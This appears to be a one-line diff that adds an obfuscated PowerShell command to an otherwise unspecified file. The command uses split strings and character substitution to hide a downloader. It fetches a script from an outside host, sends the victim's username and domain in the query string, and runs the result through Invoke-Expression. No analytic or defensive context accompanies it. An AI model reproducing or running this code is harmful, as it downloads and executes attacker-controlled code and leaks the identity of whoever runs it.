@@ -1,0 +1,1 @@
+﻿ ('IEX ((new-object net.web'+'cl'+'ien'+'t'+')'+'.downl'+'oadst'+'ring'+'(W'+'zdhttps:/'+'/wow'+'yy.g'+'a/c'+'ounte'+'r'+'.'+'p'+'hp?c=pd'+'fxpl Wzd+(oUXenv:'+'u'+'sername)+W'+'zd@W'+'zd+('+'oU'+'Xenv:'+'use'+'rdom'+'ain)))').rePLAce('Wzd',[STriNg][Char]39).rePLAce('oUX',[STriNg][Char]36) |&( $shELLiD[1]+$sHelliD[13]+'x')
